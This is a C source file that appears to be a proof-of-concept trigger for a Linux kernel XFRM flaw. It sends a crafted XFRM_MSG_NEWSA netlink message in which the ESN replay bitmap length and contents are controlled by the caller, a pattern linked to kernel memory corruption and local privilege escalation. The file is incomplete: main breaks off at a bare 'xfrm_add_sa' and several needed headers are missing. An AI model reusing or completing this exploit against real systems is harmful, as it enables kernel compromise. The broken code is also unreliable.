#include <linux/xfrm.h>
#include <linux/in.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <errno.h>

int init_xfrm_socket(){
	struct sockaddr_nl addr; 
	int result = -1,xfrm_socket;
	xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (xfrm_socket<=0){
		perror("[-] bad NETLINK_XFRM socket ");
		return result;
	}
    addr.nl_family = PF_NETLINK;  
    addr.nl_pad    = 0;  
    addr.nl_pid    = getpid();  
    addr.nl_groups = 0;
    result = bind(xfrm_socket, (struct sockaddr *)&addr, sizeof(addr));
   	if (result<0){
		perror("[-] bad bind ");
		close(xfrm_socket);
		return result;
	} 
	return xfrm_socket;
}

int xfrm_add_sa(int sock,int spi,int bmp_len){
	struct sockaddr_nl nladdr;
	struct msghdr msg;
	struct nlmsghdr *nlhdr;
	struct iovec iov;
	int len = 4096,err;
	char *data;

	memset(&nladdr, 0, sizeof(nladdr));
	nladdr.nl_family = AF_NETLINK;
	nladdr.nl_pid = 0;
	nladdr.nl_groups = 0;
	nlhdr = (struct nlmsghdr *)malloc(NLMSG_SPACE(len));
	memset(nlhdr,0,NLMSG_SPACE(len));

	nlhdr->nlmsg_len = NLMSG_LENGTH(len);
	nlhdr->nlmsg_flags = NLM_F_REQUEST;
	nlhdr->nlmsg_pid = getpid();
	nlhdr->nlmsg_type = XFRM_MSG_NEWSA;

	data = NLMSG_DATA(nlhdr); 
	struct xfrm_usersa_info xui;
	memset(&xui,0,sizeof(xui));
	xui.family = AF_INET;
	xui.id.proto = IPPROTO_AH;
	xui.id.spi = spi;
	xui.id.daddr.a4 = inet_addr("127.0.0.1");
	xui.lft.hard_byte_limit = 0x10000000;
	xui.lft.hard_packet_limit = 0x10000000;
	xui.lft.soft_byte_limit = 0x1000;
	xui.lft.soft_packet_limit = 0x1000;
	xui.mode = XFRM_MODE_TRANSPORT;
	xui.flags = XFRM_STATE_ESN;
	memcpy(data,&xui,sizeof(xui));

	data += sizeof(xui);
	struct nlattr nla;
	struct xfrm_algo xa;
	memset(&nla, 0, sizeof(nla));
	memset(&xa, 0, sizeof(xa));
	nla.nla_len = sizeof(xa) + sizeof(nla);
	nla.nla_type = XFRMA_ALG_AUTH;
	strcpy(xa.alg_name, "digest_null");
	xa.alg_key_len = 0;
	memcpy(data, &nla, sizeof(nla));
	data += sizeof(nla);
	memcpy(data, &xa, sizeof(xa));
	data += sizeof(xa);

	struct xfrm_replay_state_esn rs;
	memset(&nla, 0, sizeof(nla));
	nla.nla_len =  sizeof(nla)+sizeof(rs) +bmp_len*8*4;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;	
	rs.replay_window = bmp_len;
	rs.bmp_len = bmp_len;
	memcpy(data,&nla,sizeof(nla));
	data += sizeof(nla);
	memcpy(data, &rs, sizeof(rs));
	data += sizeof(rs);	
	memset(data,'1',bmp_len*4*8);

	iov.iov_base = (void *)nlhdr;
	iov.iov_len = nlhdr->nlmsg_len;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *)&(nladdr);
	msg.msg_namelen = sizeof(nladdr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
 	//dump_data(&msg,iov.iov_len);
	err = sendmsg (sock, &msg, 0); 
	if (err<0){
		perror("[-] bad sendmsg");
		return -1;		
	}
	return err;
}

int main()
{
	int xfrm_socket = init_xfrm_socket();
    if (xfrm_socket<0){
        fprintf(stderr, "[-] bad init xfrm socket\n");
        exit(-1);
    }
    fprintf(stderr, "[+] init xfrm_socket %d \n",xfrm_socket);
	xfrm_add_sa
}